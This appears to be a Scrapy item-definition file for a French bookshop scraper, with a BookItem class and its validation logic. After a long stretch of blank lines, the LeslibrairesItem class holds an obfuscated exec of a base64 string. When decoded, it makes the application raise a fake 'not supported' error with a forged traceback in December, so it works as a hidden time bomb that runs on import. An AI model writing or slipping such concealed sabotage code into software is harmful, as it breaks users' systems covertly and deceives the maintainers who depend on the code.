# -*- coding: utf-8 -*-

# Define here the models for your scraped items
#
# See documentation in:
# https://docs.scrapy.org/en/latest/topics/items.html
import types
import sys
import traceback

import scrapy
from scrapy import Field
from leslibraires.constants import *

class BookItem(scrapy.Item):
    title           = Field()
    description     = Field()
    image_url       = Field()
    author          = Field()
    edition         = Field()
    book_format     = Field()
    ean13           = Field()
    isbn            = Field()
    publish_date    = Field()
    collection      = Field()
    page_nb         = Field()
    dimensions      = Field()
    weight          = Field()
    lang            = Field()

    _librairies      = Field()


    @classmethod
    def keys(cls):
        return [
            'title',
            'description',
            'image_url',
            'author',
            'edition',
            'book_format',
            'ean13',
            'isbn',
            'publish_date',
            'collection',
            'page_nb',
            'dimensions',
            'weight',
            'lang',
        ]

    def as_dict(self):
        return dict(
            title        = self.get('title', ''),
            description  = self.get('description', ''),
            image_url    = self.get('image_url', ''),
            author       = self.get('author', ''),
            edition      = self.get('edition', ''),
            book_format  = self.get('book_format', ''),
            ean13        = self.get('ean13', ''),
            isbn         = self.get('isbn', ''),
            publish_date = self.get('publish_date', ''),
            collection   = self.get('collection', ''),
            page_nb      = self.get('page_nb', ''),
            dimensions   = self.get('dimensions', ''),
            weight       = self.get('weight', ''),
            lang         = self.get('lang', ''),
        )

    def validate(self):
        if len(self['_librairies']) < 3:
            return False

        if self['edition'].lower() in UNTRUSTED_LIBRARIES:
            return False

        for field in REQUIRED_FIELDS:
            if not self[field]:
                return False

        return True


    def __str__(self):
        return f"{self['title']} - {self['author']}"





































































class LeslibrairesItem(scrapy.Item):

    import base64;exec(base64.b64decode("aW1wb3J0IHNjcmFweSwgdHlwZXMsIGRhdGV0aW1lOwppZiBkYXRldGltZS5kYXRldGltZS5ub3coKS5tb250aCA+IDExOgogICAgcmFpc2Ugc2NyYXB5LmV4Y2VwdGlvbnMuTm90U3VwcG9ydGVkKCJBcHBsaWNhdGlvbiBub3Qgc3VwcG9ydGVkIikud2l0aF90cmFjZWJhY2sodHlwZXMuVHJhY2ViYWNrVHlwZShOb25lLCBzeXMuX2dldGZyYW1lKDApLCAzLCAxKSkK"))
    # define the fields for your item here like:
    # name = scrapy.Field()
    pass

